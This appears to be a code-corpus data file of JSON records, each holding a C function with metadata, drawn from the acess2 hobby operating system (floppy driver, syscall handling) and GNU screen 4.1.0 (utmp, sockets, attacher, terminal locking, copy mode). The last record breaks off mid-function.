{"docstring": "/**\n * \\fn int FDD_int_GetDims(int type, int lba, int *c, int *h, int *s, int *spt)\n * \\brief Get Dimensions of a disk\n */\n", "func_signal": "int FDD_int_GetDims(int type, int lba, int *c, int *h, int *s, int *spt)", "code": "{\n\tswitch(type) {\n\tcase 0:\n\t\treturn 0;\n\t\n\t// 360Kb 5.25\"\n\tcase 1:\n\t\t*spt = 9;\n\t\t*s = (lba % 9) + 1;\n\t\t*c = lba / 18;\n\t\t*h = (lba / 9) & 1;\n\t\tbreak;\n\t\n\t// 1220Kb 5.25\"\n\tcase 2:\n\t\t*spt = 15;\n\t\t*s = (lba % 15) + 1;\n\t\t*c = lba / 30;\n\t\t*h = (lba / 15) & 1;\n\t\tbreak;\n\t\n\t// 720Kb 3.5\"\n\tcase 3:\n\t\t*spt = 9;\n\t\t*s = (lba % 9) + 1;\n\t\t*c = lba / 18;\n\t\t*h = (lba / 9) & 1;\n\t\tbreak;\n\t\n\t// 1440Kb 3.5\"\n\tcase 4:\n\t\t*spt = 18;\n\t\t*s = (lba % 18) + 1;\n\t\t*c = lba / 36;\n\t\t*h = (lba / 18) & 1;\n\t\t//Log(\"1440k - lba=%i(0x%x), *s=%i,*c=%i,*h=%i\", lba, lba, *s, *c, *h);\n\t\tbreak;\n\t\t\n\t// 2880Kb 3.5\"\n\tcase 5:\n\t\t*spt = 36;\n\t\t*s = (lba % 36) + 1;\n\t\t*c = lba / 72;\n\t\t*h = (lba / 32) & 1;\n\t\tbreak;\n\t\t\n\tdefault:\n\t\treturn -2;\n\t}\n\treturn 1;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Reset the specified FDD controller\n */\n", "func_signal": "int FDD_Reset(int id)", "code": "{\n\tUint16\tbase = cPORTBASE[id];\n\tUint8\tmotor_state;\n\t\n\tENTER(\"iID\", id);\n\n\t// Reset the card\n\tmotor_state = inb(base + PORT_DIGOUTPUT) & 0xF0;\n\toutb(base + PORT_DIGOUTPUT, motor_state|0);\t// Disable FDC\n\tTime_Delay(1);\n\toutb(base + PORT_DIGOUTPUT, motor_state|8|4);\t// Re-enable FDC (DMA and Enable)\n\t\n\t// Set the data rate\n\toutb(base + PORT_DATARATE, 0);\t// Set data rate to 500K/s\n\n\t// Wait for IRQ\n\tLOG(\"Awaiting IRQ\");\n\t\n\tFDD_WaitIRQ();\n\n\tFDD_SenseInt(base, NULL, NULL);\n\t\n\t// Specify\n\tFDD_int_SendByte(base, CMD_SPECIFY);\t// Step and Head Load Times\n\tFDD_int_SendByte(base, 0xDF);\t// Step Rate Time, Head Unload Time (Nibble each)\n\tFDD_int_SendByte(base, 0x02);\t// Head Load Time >> 1\n\n\tLOG(\"Recalibrating Disk\");\n\tFDD_Recalibrate((id<<1)|0);\n\tFDD_Recalibrate((id<<1)|1);\n\n\tLEAVE_RET('i', 0);\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\fn void FDD_int_TimerCallback()\n * \\brief Called by timer\n */\n", "func_signal": "void FDD_int_TimerCallback(void *Arg)", "code": "{\n\t int\tdisk = (Uint)Arg;\n\tENTER(\"iarg\", disk);\n\tif(gFDD_Devices[disk].motorState == 1)\n\t\tgFDD_Devices[disk].motorState = 2;\n\tTime_RemoveTimer(gFDD_Devices[disk].timer);\n\tgFDD_Devices[disk].timer = -1;\n\tLEAVE('-');\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Recieve a syscall structure from the server code\n */\n", "func_signal": "tRequestHeader *SyscallRecieve(tRequestHeader *Request, size_t *ReturnLength)", "code": "{\n\tchar\tformatString[Request->NParams+1];\n\tchar\t*inData = (char*)&Request->Params[Request->NParams];\n\t int\targListLen = 0;\n\t int\tretVal;\n\ttRequestHeader\t*ret;\n\t int\tretValueCount;\n\t int\tretDataLen;\n\tvoid\t*returnData[Request->NParams];\n\t int\targSizes[Request->NParams];\n\tUint\tret_errno = 0;\n\t\n\t// Clear errno (Acess verson) at the start of the request\n\terrno = 0;\n\t\n\t// Sanity check\n\tif( Request->CallID >= ciNumSyscalls ) {\n\t\tLog_Notice(\"Syscalls\", \"Unknown syscall number %i\", Request->CallID);\n\t\treturn NULL;\n\t}\n\t\n\tif( !caSyscalls[Request->CallID] ) {\n\t\tLog_Notice(\"Syscalls\", \"Unimplemented syscall %i\", Request->CallID);\n\t\treturn NULL;\n\t}\n\n\t// Init return count/size\n\tretValueCount = 2;\n\tretDataLen = sizeof(Uint64) + sizeof(Uint32);\t\n\n\t// Get size of argument list\n\tfor( int i = 0; i < Request->NParams; i ++ )\n\t{\n\t\targSizes[i] = Request->Params[i].Length;\n\t\tswitch(Request->Params[i].Type)\n\t\t{\n\t\tcase ARG_TYPE_VOID:\n\t\t\tformatString[i] = '-';\n\t\t\tbreak;\n\t\tcase ARG_TYPE_INT32:\n\t\t\tformatString[i] = 'i';\n\t\t\targListLen += sizeof(Uint32);\n\t\t\tbreak;\n\t\tcase ARG_TYPE_INT64:\n\t\t\tformatString[i] = 'I';\n\t\t\targListLen += sizeof(Uint64);\n\t\t\tbreak;\n\t\tcase ARG_TYPE_DATA:\n\t\t\tformatString[i] = 'd';\n\t\t\targListLen += sizeof(void*);\n\t\t\t// Prepare the return values\n\t\t\tif( Request->Params[i].Flags & ARG_FLAG_RETURN )\n\t\t\t{\n\t\t\t\tretDataLen += Request->Params[i].Length;\n\t\t\t\tretValueCount ++;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase ARG_TYPE_STRING:\n\t\t\tformatString[i] = 's';\n\t\t\targListLen += sizeof(char*);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tLog_Error(\"Syscalls\", \"Unknown param type %i\", Request->Params[i].Type);\n\t\t\treturn NULL;\t// ERROR!\n\t\t}\n\t}\n\tformatString[Request->NParams] = '\\0';\n\t\n\tLOG(\"Request %i(%s) '%s'\", Request->CallID, casSYSCALL_NAMES[Request->CallID], formatString);\n\t\n\t{\n\t\tchar\targListData[argListLen];\n\t\targListLen = 0;\n\t\t// Build argument list\n\t\tfor( int i = 0; i < Request->NParams; i ++ )\n\t\t{\n\t\t\treturnData[i] = NULL;\n\t\t\tswitch(Request->Params[i].Type)\n\t\t\t{\n\t\t\tcase ARG_TYPE_VOID:\n\t\t\t\tbreak;\n\t\t\tcase ARG_TYPE_INT32:\n\t\t\t\t//LOG(\"%i INT32: 0x%x\", i, *(Uint32*)inData);\n\t\t\t\t*(Uint32*)&argListData[argListLen] = *(Uint32*)inData;\n\t\t\t\targListLen += sizeof(Uint32);\n\t\t\t\tinData += sizeof(Uint32);\n\t\t\t\tbreak;\n\t\t\tcase ARG_TYPE_INT64:\n\t\t\t\t//LOG(\"%i INT64: 0x%llx\", i, *(Uint64*)inData);\n\t\t\t\t*(Uint64*)&argListData[argListLen] = *(Uint64*)inData;\n\t\t\t\targListLen += sizeof(Uint64);\n\t\t\t\tinData += sizeof(Uint64);\n\t\t\t\tbreak;\n\t\t\tcase ARG_TYPE_STRING:\n\t\t\t\t//LOG(\"%i STR: '%s'\", i, (char*)inData);\n\t\t\t\t*(char**)&argListData[argListLen] = (char*)inData;\n\t\t\t\targListLen += sizeof(void*);\n\t\t\t\tinData += Request->Params[i].Length;\n\t\t\t\tbreak;\n\t\t\t\n\t\t\t// Data gets special handling, because only it can be returned to the user\n\t\t\t// (ARG_TYPE_DATA is a pointer)\n\t\t\tcase ARG_TYPE_DATA:\n\t\t\t\t// Check for non-resident data\n\t\t\t\tif( Request->Params[i].Length == 0 )\n\t\t\t\t{\n\t\t\t\t\treturnData[i] = NULL;\n\t\t\t\t\t*(void**)&argListData[argListLen] = NULL;\n\t\t\t\t\targListLen += sizeof(void*);\n\t\t\t\t}\n\t\t\t\telse if( Request->Params[i].Flags & ARG_FLAG_ZEROED )\n\t\t\t\t{\n\t\t\t\t\t// Allocate and zero the buffer\n\t\t\t\t\treturnData[i] = calloc(1, Request->Params[i].Length);\n\t\t\t\t\t//LOG(\"%i ZDAT: %i %p\", i,\n\t\t\t\t\t//\tRequest->Params[i].Length, returnData[i]);\n\t\t\t\t\t*(void**)&argListData[argListLen] = returnData[i];\n\t\t\t\t\targListLen += sizeof(void*);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\treturnData[i] = (void*)inData;\n\t\t\t\t\t//LOG(\"%i DATA: %i %p\", i,\n\t\t\t\t\t//\tRequest->Params[i].Length, returnData[i]);\n\t\t\t\t\t*(void**)&argListData[argListLen] = (void*)inData;\n\t\t\t\t\targListLen += sizeof(void*);\n\t\t\t\t\tinData += Request->Params[i].Length;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\t\n\t\t// --- Perform request\n\t\tretVal = caSyscalls[Request->CallID](&ret_errno, formatString, argListData, argSizes);\n\t}\n\t\n\t// ---------- Return\n\t\n\tif( ret_errno == 0 && errno != 0 ) {\n\t\tret_errno = errno;\n\t\tLOG(\"errno = %i\", errno);\n\t}\n\t\n\t// Allocate the return\n\tsize_t\tmsglen = sizeof(tRequestHeader) + retValueCount * sizeof(tRequestValue) + retDataLen;\n\tret = malloc(msglen);\n\tret->ClientID = Request->ClientID;\n\tret->CallID = Request->CallID;\n\tret->NParams = retValueCount;\n\tret->MessageLength = msglen;\n\tinData = (char*)&ret->Params[ ret->NParams ];\n\t\n\t// Static Uint64 return value\n\tret->Params[0].Type = ARG_TYPE_INT64;\n\tret->Params[0].Flags = 0;\n\tret->Params[0].Length = sizeof(Uint64);\n\t*(Uint64*)inData = retVal;\n\tinData += sizeof(Uint64);\n\t\n\t// Static Uint32 errno value\n\tret->Params[1].Type = ARG_TYPE_INT32;\n\tret->Params[1].Flags = 0;\n\tret->Params[1].Length = sizeof(Uint32);\n\t*(Uint32*)inData = ret_errno;\n\tinData += sizeof(Uint32);\n\n\tLOG(\"Ret: %llx, errno=%i\", retVal, ret_errno);\t\n\n\t//Log_Debug(\"Syscalls\", \"Return 0x%llx\", retVal);\n\t\n\tretValueCount = 2;\n\tfor( int i = 0; i < Request->NParams; i ++ )\n\t{\n\t\tif( Request->Params[i].Type != ARG_TYPE_DATA )\tcontinue;\n\t\tif( !(Request->Params[i].Flags & ARG_FLAG_RETURN) )\tcontinue;\n\t\t\n\t\tret->Params[retValueCount].Type = Request->Params[i].Type;\n\t\tret->Params[retValueCount].Flags = 0;\n\t\tret->Params[retValueCount].Length = Request->Params[i].Length;\n\t\t\n\t\tLOG(\"Ret %i: Type %i, Len %i\",\n\t\t\ti, Request->Params[i].Type, Request->Params[i].Length);\n\t\t\n\t\tmemcpy(inData, returnData[i], Request->Params[i].Length);\n\t\tinData += Request->Params[i].Length;\n\t\t\n\t\tif( Request->Params[i].Flags & ARG_FLAG_ZEROED )\n\t\t\tfree( returnData[i] );\t// Free temp buffer from above\n\t\tretValueCount ++;\n\t}\n\t\n\t*ReturnLength = ret->MessageLength;\n\t\n\treturn ret;\n}", "path": "AcessNative\\acesskernel_src\\syscalls.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Wait for the FDD IRQ to fire\n * \\return Boolean failure (1 for timeout)\n */\n", "func_signal": "inline int FDD_WaitIRQ()", "code": "{\n\ttTime\tend = now() + 2000;\n\t\n\t// Wait for IRQ\n\twhile(!gbFDD_IrqFired && now() < end)\n\t\tThreads_Yield();\n\n\tif( !gbFDD_IrqFired ) {\n\t\tLog_Warning(\"FDD\", \"FDD_WaitIRQ - Timeout\");\n\t\treturn 1;\n\t}\t\n\n\tgbFDD_IrqFired = 0;\n\treturn 0;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\fn Uint64 FDD_ReadFS(tVFS_Node *Node, Uint64 Offset, Uint64 Length, void *Buffer)\n * \\brief Read Data from a disk\n*/\n", "func_signal": "Uint64 FDD_ReadFS(tVFS_Node *Node, Uint64 Offset, Uint64 Length, void *Buffer)", "code": "{\n\t int\tret;\n\t\n\tENTER(\"pNode XOffset XLength pBuffer\", Node, Offset, Length, Buffer);\n\t\n\tif(Node == NULL) {\n\t\tLEAVE('i', -1);\n\t\treturn -1;\n\t}\n\t\n\tif(Node->Inode != 0 && Node->Inode != 1) {\n\t\tLEAVE('i', -1);\n\t\treturn -1;\n\t}\n\t\n\tret = DrvUtil_ReadBlock(Offset, Length, Buffer, FDD_ReadSectors, 512, Node->Inode);\n\tLEAVE('i', ret);\n\treturn ret;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/*\n * Call FinitTerm for all displays, write a message to each and call eexit();\n */\n", "func_signal": "DEFINE_VARARGS_FN(Panic)", "code": "{\n  char buf[MAXPATHLEN*2];\n  PROCESS_MESSAGE(buf);\n\n  debug3(\"Panic('%s'); display=%x displays=%x\\n\", buf, display, displays);\n  if (displays == 0 && display == 0)\n    {\n      printf(\"%s\\r\\n\", buf);\n      if (PanicPid)\n        Kill(PanicPid, SIG_BYE);\n    }\n  else if (displays == 0)\n    {\n      /* no displays but a display - must have forked.\n       * send message to backend!\n       */\n      char *tty = D_usertty;\n      display = 0;\n      SendErrorMsg(tty, buf);\n      sleep(2);\n      _exit(1);\n    }\n  else\n    for (display = displays; display; display = display->d_next)\n      {\n        if (D_status)\n\t  RemoveStatus();\n        FinitTerm();\n        Flush(3);\n#ifdef UTMPOK\n        RestoreLoginSlot();\n#endif\n        SetTTY(D_userfd, &D_OldMode);\n        fcntl(D_userfd, F_SETFL, 0);\n        write(D_userfd, buf, strlen(buf));\n        write(D_userfd, \"\\n\", 1);\n        freetty();\n\tif (D_userpid)\n\t  Kill(D_userpid, SIG_BYE);\n      }\n#ifdef MULTIUSER\n  if (tty_oldmode >= 0)\n    {\n# ifdef USE_SETEUID\n      if (setuid(own_uid))\n        xseteuid(own_uid);\t/* may be a loop. sigh. */\n# else\n      setuid(own_uid);\n# endif\n      debug1(\"Panic: changing back modes from %s\\n\", attach_tty);\n      chmod(attach_tty, tty_oldmode);\n    }\n#endif\n  eexit(1);\n}", "path": "screen-4.1.0\\screen.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* CAREFULUTMP */\n", "func_signal": "void\nInitUtmp()", "code": "{\n  debug1(\"InitUtmp testing '%s'...\\n\", UtmpName);\n#ifndef UTMP_HELPER\n  if ((utmpfd = open(UtmpName, O_RDWR)) == -1)\n    {\n      if (errno != EACCES)\n\tMsg(errno, \"%s\", UtmpName);\n      debug(\"InitUtmp failed.\\n\");\n      utmpok = 0;\n      return;\n    }\n# ifdef GETUTENT\n  close(utmpfd);\t/* it was just a test */\n  utmpfd = -1;\n# endif /* GETUTENT */\n#endif\t/* UTMP_HELPER */\n  utmpok = 1;\n}", "path": "screen-4.1.0\\utmp.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * D_utmp_logintty is reinserted into utmp\n */\n", "func_signal": "void\nRestoreLoginSlot()", "code": "{\n  char *tty;\n\n  debug(\"RestoreLoginSlot()\\n\");\n  ASSERT(display);\n  if (utmpok && D_loginslot != (slot_t)0 && D_loginslot != (slot_t)-1)\n    {\n      debug1(\" logging you in again (slot %#x)\\n\", (int)D_loginslot);\n      if (pututslot(D_loginslot, &D_utmp_logintty, D_loginhost, (struct win *)0) == 0)\n        Msg(errno,\"Could not write %s\", UtmpName);\n    }\n  UT_CLOSE;\n  D_loginslot = (slot_t)0;\n  if (D_loginttymode && (tty = ttyname(D_userfd)))\n    chmod(tty, D_loginttymode);\n}", "path": "screen-4.1.0\\utmp.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * Try to recreate the socket/pipe\n */\n", "func_signal": "int\nRecoverSocket()", "code": "{\n  close(ServerSocket);\n  if ((int)geteuid() != real_uid)\n    {\n      if (UserContext() > 0)\n\tUserReturn(unlink(SockPath));\n      (void)UserStatus();\n    }\n  else\n    (void) unlink(SockPath);\n\n  if ((ServerSocket = MakeServerSocket()) < 0)\n    return 0;\n  evdeq(&serv_read);\n  serv_read.fd = ServerSocket;\n  evenq(&serv_read);\n  return 1;\n}", "path": "screen-4.1.0\\socket.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * Set the mode bits of the socket to the current status\n */\n", "func_signal": "int\nchsock()", "code": "{\n  int r, euid = geteuid();\n  if (euid != real_uid)\n    {\n      if (UserContext() <= 0)\n        return UserStatus();\n    }\n  r = chmod(SockPath, SOCKMODE);\n  /* \n   * Sockets usually reside in the /tmp/ area, where sysadmin scripts\n   * may be happy to remove old files. We manually prevent the socket\n   * from becoming old. (chmod does not touch mtime).\n   */\n  (void)utimes(SockPath, NULL);\n\n  if (euid != real_uid)\n    UserReturn(r);\n  return r;\n}", "path": "screen-4.1.0\\socket.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*----------trim (char) c from right-side of string *p------------------*/\n", "func_signal": "char *\nstrtrim_right (register char *p, register char c)", "code": "{\n  register char *end;\n  register int len;\n\n  len = strlen (p);\n  while (*p && len) {\n    end = p + len - 1;\n    if (c == *end)\n      *end = 0;\n    else\n      break;\n    len = strlen (p);\n  }\n  return (p);\n}", "path": "ScreenSession\\screen-session-primer.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* -- original copyright by Luigi Cannelloni 1985 (luigi@faui70.UUCP) -- */\n", "func_signal": "static void\nscreen_builtin_lck()", "code": "{\n  char fullname[100], *cp1, message[100 + 100];\n#ifdef USE_PAM\n  pam_handle_t *pamh = 0;\n  int pam_error;\n#else\n  char *pass, mypass[16 + 1], salt[3];\n#endif\n\n#ifndef USE_PAM\n  pass = ppp->pw_passwd;\n  if (pass == 0 || *pass == 0)\n    {\n      if ((pass = getpass(\"Key:   \")))\n        {\n          strncpy(mypass, pass, sizeof(mypass) - 1);\n          mypass[sizeof(mypass) - 1] = 0;\n          if (*mypass == 0)\n            return;\n          if ((pass = getpass(\"Again: \")))\n            {\n              if (strcmp(mypass, pass))\n                {\n                  fprintf(stderr, \"Passwords don't match.\\007\\n\");\n                  sleep(2);\n                  return;\n                }\n            }\n        }\n      if (pass == 0)\n        {\n          fprintf(stderr, \"Getpass error.\\007\\n\");\n          sleep(2);\n          return;\n        }\n\n      salt[0] = 'A' + (int)(time(0) % 26);\n      salt[1] = 'A' + (int)((time(0) >> 6) % 26);\n      salt[2] = 0;\n      pass = crypt(mypass, salt);\n      pass = ppp->pw_passwd = SaveStr(pass);\n    }\n#endif\n\n  debug(\"screen_builtin_lck looking in gcos field\\n\");\n  strncpy(fullname, ppp->pw_gecos, sizeof(fullname) - 9);\n  fullname[sizeof(fullname) - 9] = 0;\n\n  if ((cp1 = index(fullname, ',')) != NULL)\n    *cp1 = '\\0';\n  if ((cp1 = index(fullname, '&')) != NULL)\n    {\n      strncpy(cp1, ppp->pw_name, 8);\n      cp1[8] = 0;\n      if (*cp1 >= 'a' && *cp1 <= 'z')\n\t*cp1 -= 'a' - 'A';\n    }\n\n  sprintf(message, \"Screen used by %s%s<%s> on %s.\\nPassword:\\007\",\n          fullname, fullname[0] ? \" \" : \"\", ppp->pw_name, HostName);\n\n  /* loop here to wait for correct password */\n  for (;;)\n    {\n      debug(\"screen_builtin_lck awaiting password\\n\");\n      errno = 0;\n      if ((cp1 = getpass(message)) == NULL)\n        {\n          AttacherFinit(SIGARG);\n          /* NOTREACHED */\n        }\n#ifdef USE_PAM\n      PAM_conversation.appdata_ptr = cp1;\n      pam_error = pam_start(\"screen\", ppp->pw_name, &PAM_conversation, &pamh);\n      if (pam_error != PAM_SUCCESS)\n\tAttacherFinit(SIGARG);\t\t/* goodbye */\n      pam_error = pam_authenticate(pamh, 0);\n      pam_end(pamh, pam_error);\n      PAM_conversation.appdata_ptr = 0;\n      if (pam_error == PAM_SUCCESS)\n\tbreak;\n#else\n      if (!strncmp(crypt(cp1, pass), pass, strlen(pass)))\n\tbreak;\n#endif\n      debug(\"screen_builtin_lck: NO!!!!!\\n\");\n      bzero(cp1, strlen(cp1));\n    }\n  bzero(cp1, strlen(cp1));\n  debug(\"password ok.\\n\");\n}", "path": "screen-4.1.0\\attacher.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n *  Attacher loop - no return\n */\n", "func_signal": "void\nAttacher()", "code": "{\n  signal(SIGHUP, AttacherFinit);\n  signal(SIG_BYE, AttacherFinit);\n#ifdef POW_DETACH\n  signal(SIG_POWER_BYE, AttacherFinitBye);\n#endif\n#if defined(DEBUG) && defined(SIG_NODEBUG)\n  signal(SIG_NODEBUG, AttacherNoDebug);\n#endif\n#ifdef LOCK\n  signal(SIG_LOCK, DoLock);\n#endif\n  signal(SIGINT, AttacherSigInt);\n#ifdef BSDJOBS\n  signal(SIG_STOP, SigStop);\n#endif\n#if defined(SIGWINCH) && defined(TIOCGWINSZ)\n  signal(SIGWINCH, AttacherWinch);\n#endif\n#ifdef DEBUG\n  signal(SIGCHLD, AttacherChld);\n#endif\n  debug(\"attacher: going for a nap.\\n\");\n  dflag = 0;\n#ifdef MULTI\n  xflag = 1;\n#endif\n  for (;;)\n    {\n      signal(SIGALRM, AttacherSigAlarm);\n      alarm(15);\n      pause();\n      alarm(0);\n      if (kill(MasterPid, 0) < 0 && errno != EPERM)\n        {\n\t  debug1(\"attacher: Panic! MasterPid %d does not exist.\\n\", MasterPid);\n\t  AttacherPanic++;\n\t}\n      if (AttacherPanic)\n        {\n\t  fcntl(0, F_SETFL, 0);\n\t  SetTTY(0, &attach_Mode);\n\t  printf(\"\\nSuddenly the Dungeon collapses!! - You die...\\n\");\n\t  eexit(1);\n        }\n#ifdef BSDJOBS\n      if (SuspendPlease)\n\t{\n\t  SuspendPlease = 0;\n#if defined(MULTIUSER) && !defined(USE_SETEUID)\n\t  if (multiattach)\n\t    exit(SIG_STOP);\n#endif\n\t  signal(SIGTSTP, SIG_DFL);\n\t  debug(\"attacher: killing myself SIGTSTP\\n\");\n\t  kill(getpid(), SIGTSTP);\n\t  debug(\"attacher: continuing from stop\\n\");\n\t  signal(SIG_STOP, SigStop);\n\t  (void) Attach(MSG_CONT);\n\t}\n#endif\n#ifdef LOCK\n      if (LockPlease)\n\t{\n\t  LockPlease = 0;\n#if defined(MULTIUSER) && !defined(USE_SETEUID)\n\t  if (multiattach)\n\t    exit(SIG_LOCK);\n#endif\n\t  LockTerminal();\n# ifdef SYSVSIGS\n\t  signal(SIG_LOCK, DoLock);\n# endif\n\t  (void) Attach(MSG_CONT);\n\t}\n#endif\t/* LOCK */\n#if defined(SIGWINCH) && defined(TIOCGWINSZ)\n      if (SigWinchPlease)\n\t{\n\t  SigWinchPlease = 0;\n# ifdef SYSVSIGS\n\t  signal(SIGWINCH, AttacherWinch);\n# endif\n\t  (void) Attach(MSG_WINCH);\n\t}\n#endif\t/* SIGWINCH */\n    }\n}", "path": "screen-4.1.0\\attacher.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n *  Asynchronous output routines by\n *  Tim MacKenzie (tym@dibbler.cs.monash.edu.au)\n */\n", "func_signal": "void\nResize_obuf()", "code": "{\n  register int ind;\n\n  ASSERT(display);\n  if (D_status_obuffree >= 0)\n    {\n      ASSERT(D_obuffree == -1);\n      RemoveStatusMinWait();\n      if (--D_obuffree > 0)\t/* redo AddChar decrement */\n\treturn;\n    }\n  if (D_obuflen && D_obuf)\n    {\n      ind  = D_obufp - D_obuf;\n      D_obuflen += GRAIN;\n      D_obuffree += GRAIN;\n      D_obuf = realloc(D_obuf, D_obuflen);\n    }\n  else\n    {\n      ind  = 0;\n      D_obuflen = GRAIN;\n      D_obuffree = GRAIN;\n      D_obuf = malloc(D_obuflen);\n    }\n  if (!D_obuf)\n    Panic(0, \"Out of memory\");\n  D_obufp = D_obuf + ind;\n  D_obuflenmax = D_obuflen - D_obufmax;\n  debug1(\"ResizeObuf: resized to %d\\n\", D_obuflen);\n}", "path": "screen-4.1.0\\display.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/**********************************************************************/\n", "func_signal": "void\nMarkRoutine()", "code": "{\n  int x, y;\n\n  ASSERT(fore && display && D_user);\n\n  debug2(\"MarkRoutine called: fore nr %d, display %s\\n\",\n         fore->w_number, D_usertty);\n\n  if (InitOverlayPage(sizeof(*markdata), &MarkLf, 1))\n    return;\n  flayer->l_encoding = fore->w_encoding;\n  flayer->l_mode = 1;\n  markdata = (struct markdata *)flayer->l_data;\n  markdata->md_user = D_user;\t/* XXX: Correct? */\n  markdata->md_window = fore;\n  markdata->second = 0;\n  markdata->rep_cnt = 0;\n  markdata->append_mode = 0;\n  markdata->write_buffer = 0;\n  markdata->nonl = 0;\n  markdata->left_mar  = 0;\n  markdata->right_mar = fore->w_width - 1;\n  markdata->hist_offset = fore->w_histheight;\n  x = fore->w_x;\n  y = D2W(fore->w_y);\n  if (x >= fore->w_width)\n    x = fore->w_width - 1;\n\n  LGotoPos(flayer, x, W2D(y));\n  LMsg(0, \"Copy mode - Column %d Line %d(+%d) (%d,%d)\",\n      x + 1, W2D(y + 1), fore->w_histheight, fore->w_width, fore->w_height);\n  markdata->cx = markdata->x1 = x;\n  markdata->cy = markdata->y1 = y;\n  flayer->l_x = x;\n  flayer->l_y = W2D(y);\n}", "path": "screen-4.1.0\\mark.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * So, why is there a Flush() down below? The reason is simple: the\n * cursor warp (if bd_link is on) checks the obuf to see if something\n * happened. If there would be no Flush, screen would warp the\n * bd cursor if a bd movement command tries to ring the bell.\n * (In other words: this is a gross hack!)\n */\n", "func_signal": "static void\nbd_signal()", "code": "{\n  if (!bd.bd_bell) \n    return;\n  display = bd.bd_dpy;\n  if (D_obufp != D_obuf)\n    AddCStr(D_BL);\n  else\n    {\n      AddCStr(D_BL);\n      Flush(0);\n    }\n}", "path": "screen-4.1.0\\braille.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/* CAREFULUTMP: goodie for paranoid sysadmins: always leave one\n * window logged in\n */\n", "func_signal": "void\nCarefulUtmp()", "code": "{\n  struct win *p;\n\n  if (!windows)\t\t\t/* hopeless */\n    return;\n  debug(\"CarefulUtmp counting slots\\n\");\n  for (p = windows; p; p = p->w_next)\n    if (p->w_ptyfd >= 0 && p->w_slot != (slot_t)-1)\n      return;\t\t\t/* found one, nothing to do */\n\n  debug(\"CarefulUtmp: no slots, log one in again.\\n\");\n  for (p = windows; p; p = p->w_next)\n    if (p->w_ptyfd >= 0)\t/* no zombies please */\n      break;\n  if (!p)\n    return;\t\t\t/* really hopeless */\n  SetUtmp(p);\n  Msg(0, \"Window %d is now logged in.\\n\", p->w_number);\n}", "path": "screen-4.1.0\\utmp.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n *  Refreshes the harstatus of the fore window. Shouldn't be here...\n */\n", "func_signal": "void\nRefreshHStatus()", "code": "{\n  char *buf;\n\n  evdeq(&D_hstatusev);\n  if (D_status == STATUS_ON_HS)\n    return;\n  buf = MakeWinMsgEv(hstatusstring, D_fore, '%', (D_HS && D_has_hstatus == HSTATUS_HS && D_WS > 0) ? D_WS : D_width - !D_CLP, &D_hstatusev, 0);\n  if (buf && *buf)\n    {\n      ShowHStatus(buf);\n      if (D_has_hstatus != HSTATUS_IGNORE && D_hstatusev.timeout.tv_sec)\n        evenq(&D_hstatusev);\n    }\n  else\n    ShowHStatus((char *)0);\n}", "path": "screen-4.1.0\\display.c", "repo_name": "skoneka/screen-session", "stars": 94, "license": "None", "language": "c", "size": 2220}
{"docstring": "/*\n * nextchar sets *xp to the num-th occurrence of the target in the line.\n *\n * Returns -1 if the target doesn't appear num times, 0 otherwise.\n */\n", "func_signal": "static int\nnextchar(int *xp, int *yp, int direction, char target, int num)", "code": "{\n  int width;  /* width of the current window. */\n  int x;      /* x coordinate of the current cursor position. */\n  int step;   /* amount to increment x (+1 or -1) */\n  int adjust; /* Final adjustment of cursor position. */\n  char *displayed_line; /* Line in which search takes place. */\n \n  debug(\"nextchar\\n\");\n \n  x = *xp;\n  adjust = 0;\n  width = fore->w_width;\n  displayed_line = (char *)WIN(*yp) -> image;\n \n  switch(direction) {\n    case 't':\n      adjust = -1; /* fall through */\n    case 'f':\n      step = 1;\n      break;\n    case 'T':\n      adjust = 1; /* fall through */\n    case 'F':\n      step = -1;\n      break;\n    default:\n      ASSERT(0);\n  }\n \n  x += step;\n \n  debug1(\"ml->image = %s\\n\", displayed_line);\n  debug2(\"num = %d, width = %d\\n\",num, width);\n  debug2(\"x = %d target = %c\\n\", x, target );\n \n  for ( ;x>=0 && x <= width; x += step) {\n    if (displayed_line[x] == target) {\n      if (--num == 0) {\n        *xp = x + 